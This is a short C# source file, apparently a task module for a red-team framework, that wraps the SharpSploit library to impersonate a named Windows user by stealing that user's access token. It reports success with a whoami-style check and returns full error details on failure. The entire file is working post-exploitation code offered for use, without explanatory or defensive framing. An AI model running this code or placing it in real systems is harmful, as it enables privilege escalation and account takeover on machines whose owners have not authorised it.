using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class ImpersonateUser
    {
        public static string Execute(string Username)
        {
            try
            {
                using (Tokens t = new Tokens())
                {
                    if (t.ImpersonateUser(Username))
                    {
                        return "Successfully impersonated: " + t.WhoAmI();
                    }
                    else
                    {
                        return "Failed to impersonate: " + Username;
                    }
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}